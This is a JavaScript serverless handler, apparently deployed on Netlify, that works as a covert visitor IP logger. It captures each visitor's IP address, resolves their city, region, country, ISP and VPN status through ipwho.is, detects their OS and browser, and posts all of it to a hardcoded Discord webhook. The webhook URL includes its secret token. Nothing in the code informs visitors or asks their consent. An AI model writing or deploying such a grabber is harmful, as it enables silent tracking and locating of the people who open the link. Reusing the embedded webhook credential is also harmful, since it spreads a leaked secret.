exports.handler = async (event) => {
  const webhookURL = "https://discord.com/api/webhooks/1379270305272299530/EdXC7ENWy6IzQiR1-ETKyeyitOmG_It2088qG3SROttMnLqzvp6YV879Wqs-WwIYa4yk";

  const ip =
    event.headers["x-nf-client-connection-ip"] ||
    event.headers["client-ip"] ||
    event.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    "Unknown IP";

  const userAgent = event.headers["user-agent"] || "Unknown UA";
  const timestamp = new Date().toISOString();

  // Improved OS detection
  const detectOS = (ua) => {
    const l = ua.toLowerCase();
    if (l.includes("ipad") || (l.includes("macintosh") && l.includes("mobile"))) return "iPadOS";
    if (l.includes("iphone")) return "iOS";
    if (l.includes("android")) return "Android";
    if (l.includes("windows")) return "Windows";
    if (l.includes("mac os x") || l.includes("macintosh")) return "macOS";
    if (l.includes("linux")) return "Linux";
    return "Unknown";
  };

  // Simple browser detection
  const detectBrowser = (ua) => {
    const l = ua.toLowerCase();
    if (l.includes("edg/")) return "Edge";
    if (l.includes("chrome") && !l.includes("edg/") && !l.includes("opr/")) return "Chrome";
    if (l.includes("safari") && !l.includes("chrome")) return "Safari";
    if (l.includes("firefox")) return "Firefox";
    if (l.includes("opr/") || l.includes("opera")) return "Opera";
    if (l.includes("msie") || l.includes("trident")) return "Internet Explorer";
    return "Unknown";
  };

  try {
    const geoRes = await fetch(`http://ipwho.is/${ip}`);
    const geoData = await geoRes.json();

    const {
      country = "N/A",
      region = "N/A",
      city = "N/A",
      isp = "N/A",
      proxy = false,
      vpn = false,
    } = geoData;

    // VPN/Proxy flag = true if either proxy or vpn is true
    const vpnProxy = proxy || vpn;

    const os = detectOS(userAgent);
    const browser = detectBrowser(userAgent);

    const message = {
      content: `New Visitor Logged
IP: ${ip}
Location: ${city}, ${region}, ${country}
ISP: ${isp}
OS: ${os}
Browser: ${browser}
VPN/Proxy: ${vpnProxy}
Time: ${timestamp}`
    };

    await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(message),
    });

    return {
      statusCode: 200,
      body: "Logged successfully",
    };
  } catch (err) {
    console.error("Error:", err);
    return {
      statusCode: 500,
      body: "Failed to send data",
    };
  }
};
